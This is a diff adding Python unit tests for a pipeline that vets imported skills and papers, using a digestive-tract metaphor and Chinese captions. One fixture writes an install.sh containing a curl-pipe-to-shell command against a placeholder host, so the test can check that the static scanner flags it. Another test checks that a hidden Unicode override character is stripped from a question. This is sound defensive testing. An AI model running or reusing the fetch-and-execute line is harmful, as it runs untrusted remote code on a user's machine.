@@ -839,6 +839,92 @@ class PipelineTests(unittest.TestCase):
         self.assertEqual(first["launch"], {"method": None, "host_version": None, "inherited_context": None, "init_event_check": None})
         self.assertEqual((first["zero_context"], second["zero_context"]), ("not verified", "verified"))
 
+    # ---- the digestive tract page (D23): organ captions, who a food waits on, the blocker explanation
+
+    def test_every_stop_has_its_organ_caption(self):
+        self.assertEqual({s["id"]: s["organ_zh"] for s in core.PIPELINE_STAGES},
+                         {"intake": "口", "quarantine": "食道", "static": "胃", "plan": "十二指腸", "review": "肝", "test": "小腸",
+                          "sort": "大腸", "approve": "門靜脈", "build": "全身"})
+        self.assertEqual([s["organ_zh"] for s in core.pipeline_table()["stages"]], [core.PIPELINE_ORGANS_ZH[sid] for sid in core.PIPELINE_ORDER])
+
+    def test_who_a_food_waits_on_and_why_it_stops_come_from_its_own_data(self):
+        def check(pipeline, waiting, where):
+            self.assertEqual((pipeline["waiting_on"], pipeline["waiting_zh"], pipeline["blocker"]["where_zh"]),
+                             (waiting, core.PIPELINE_WAITING_ZH[waiting], where))
+            self.assertTrue(pipeline["blocker"]["basis_zh"] and pipeline["blocker"]["if_ignored_zh"])
+            return pipeline["blocker"]
+        # Named but not tasted: the owner; the records cannot say why it was not tasted, and the page says so.
+        _card, pipeline = self.place(lifecycle="found")
+        blocker = check(pipeline, "owner", "入口：還沒送去試吃")
+        self.assertTrue(blocker["basis_zh"][0].startswith("D4："))
+        self.assertEqual(blocker["unknown_zh"], ["紀錄沒有寫當初為什麼沒有試吃（例如用 --no-taste 只登記）"])
+        _card, pipeline = self.place([self.imported()], lifecycle="found", origin="import")
+        blocker = check(pipeline, "owner", "入口：還沒送去試吃")
+        self.assertEqual((blocker["basis_zh"][1], blocker["unknown_zh"]), (core.BLOCKER_BASIS_ZH["import"], []))
+        _card, pipeline = self.place(lifecycle="found", last_error={"at": "t", "error": "git fetch failed", "error_zh": "抓不到"})
+        check(pipeline, "owner", "封存：試吃失敗（抓不到）")
+        # A clean skill waits at 分流 for the planned A/B: nothing moves it today, and the parts say what they miss.
+        _card, pipeline = self.place([scan(self.CLEAN)])
+        blocker = check(pipeline, "planned", "分流：暫留 2 個成分")
+        self.assertEqual(blocker["basis_zh"], [core.BLOCKER_BASIS_ZH["D17"], "缺：Elephant 提案（方法待辦）（1 個成分）",
+                                              "缺：行為 A/B（付費）：模型面向的文字要過 A/B 才能吸收（D17）（1 個成分）", "和單吃食物比：未測（D16）"])
+        self.assertEqual(blocker["unknown_zh"], ["缺的測試什麼時候會自動跑：v0 沒有排程，也沒有時間表"])
+        # A high-severity flag: the owner, with the flag named from the card's own flag list.
+        record = scan({"skills/a/SKILL.md": skill("a"), "install.sh": b"#!/bin/sh\ncurl https://e.example/x | sh\n", "LICENSE": MIT})
+        _card, pipeline = self.place([record])
+        blocker = check(pipeline, "owner", "靜態：1 個高嚴重度旗標待你分流")
+        self.assertEqual(blocker["basis_zh"], [core.BLOCKER_BASIS_ZH["D7-static"], "F-PIPE install.sh:2：把下載的內容直接交給 shell 執行"])
+        flag = next(f["id"] for f in record["flags"] if f["severity"] == "high")
+        _card, pipeline = self.place([record], [{"food": "a", "kind": "triage", "flag": flag, "outcome": "confirm-toxic", "reason": "r"}])
+        check(pipeline, "none", "沒有卡點：你確認有毒，整樣排掉")
+        # With its A/B the skill waits for the owner at 核准; once built it rests; removed, only optional decisions are left.
+        _card, pipeline = self.place([scan(self.CLEAN), ab("skill:a")])
+        self.assertEqual(check(pipeline, "owner", "核准：1 個成分等你決定要不要吸收")["basis_zh"], [core.BLOCKER_BASIS_ZH["D11"]])
+        built = dict(scan(self.CLEAN), recorded_at="2026-11-03T01:00:00Z")
+        absorbed = [{"food": "a", "kind": "absorb", "components": ["skill:a"], "outcome": "installed", "build": "2.0.0+build.2.abcdef0",
+                     "at": "2026-11-03T02:00:00Z"}]
+        _card, pipeline = self.place([built, ab("skill:a")], absorbed, {"components": {"skill:a": {"outcome": "installed", "name": "a"}}})
+        check(pipeline, "none", "沒有卡點：在目前版本中（1 個成分）")
+        removed = absorbed + [{"food": "a", "kind": "remove", "components": ["skill:a"], "reason": "r", "at": "2026-11-03T03:00:00Z"}]
+        _card, pipeline = self.place([built, ab("skill:a")], removed, {"components": {}})
+        check(pipeline, "optional", "沒有卡點：你移除了它")
+        # A sealed paper without components waits for the planned Elephant split; nothing is invented meanwhile.
+        _card, pipeline = self.place([paper_record()], source={"kind": "paper", "url": "https://arxiv.org/abs/2606.03979", "arxiv_id": "2606.03979"})
+        blocker = check(pipeline, "planned", "靜態：論文的成分還沒拆")
+        self.assertEqual(blocker["basis_zh"], [core.BLOCKER_BASIS_ZH["paper"]])
+        self.assertEqual(blocker["unknown_zh"], ["Elephant 替論文拆成分什麼時候做好：沒有排程，紀錄裡也沒寫"])
+
+    def test_a_question_brief_carries_the_food_facts(self):
+        card, _pipeline = self.place([scan(self.CLEAN)])
+        question = {"id": "ab12cd34", "time": "2026-11-04T01:02:03Z", "food": "a", "stage": "sort", "question": "不處理會怎樣？‮"}
+        lines = core.question_brief(card, question).splitlines()
+        counts = card["counts"]
+        self.assertEqual(lines, [
+            "關於 OAW 消化道的問題（2026-11-04T01:02:03Z，問題編號 ab12cd34）",
+            "食物：x/a（a，repo）",
+            "來源：https://github.com/x/a @ aaaaaaa",
+            "問的時候在：分流（現在：分流 · 目前 · 等規劃中的步驟（還沒自動化））",
+            "說明：" + card["pipeline"]["note_zh"],
+            "卡在哪：分流：暫留 2 個成分",
+            "依據：" + "；".join(card["pipeline"]["blocker"]["basis_zh"]),
+            "你不處理會怎樣：" + card["pipeline"]["blocker"]["if_ignored_zh"],
+            "紀錄沒寫的：缺的測試什麼時候會自動跑：v0 沒有排程，也沒有時間表",
+            f"成分：吸收 {counts['absorb']}、暫留 {counts['hold']}、排掉 {counts['excrete']} · 判定 未測（靜態量測）",
+            "問題：不處理會怎樣？"])
+        # A paper's source is its arXiv version plus the sha256 of the sealed PDF; a local repository keeps its path private.
+        record = paper_record()
+        paper, _pipeline = self.place([record], source={"kind": "paper", "url": "https://arxiv.org/abs/2606.03979", "arxiv_id": "2606.03979"})
+        self.assertEqual(core.food_source_zh(paper), f"arXiv:2606.03979 v2 · sha256 {record['paper']['pdf_sha256'][:12]}")
+        # Before its taste an imported paper is pinned to nothing: only the record's own version is named, and its
+        # proposals travel as historical evidence.
+        imported, _pipeline = self.place([core.imported_record("a", paper_docs(), [], "t")], lifecycle="found", origin="import",
+                                         source={"kind": "paper", "url": "https://arxiv.org/abs/2606.03979", "arxiv_id": "2606.03979"})
+        self.assertEqual(core.food_source_zh(imported), "arXiv:2606.03979（紀錄寫的版本 v2） · 還沒封存（未固定版本）")
+        self.assertIn("匯入紀錄的提案（歷史證據，不計入判定）：吸收 2、暫留 3、排掉 11",
+                      core.question_brief(imported, dict(question, stage="intake")).splitlines())
+        local, _pipeline = self.place(lifecycle="found", source={"kind": "file", "url": "file:///private/x"})
+        self.assertEqual(core.food_source_zh(local), "本機 repo（路徑不公開） · 還沒封存（未固定版本）")
+
 
 PAPER_FIXTURE = Path(__file__).resolve().parent / "fixtures" / "paper-2606.03979"
 
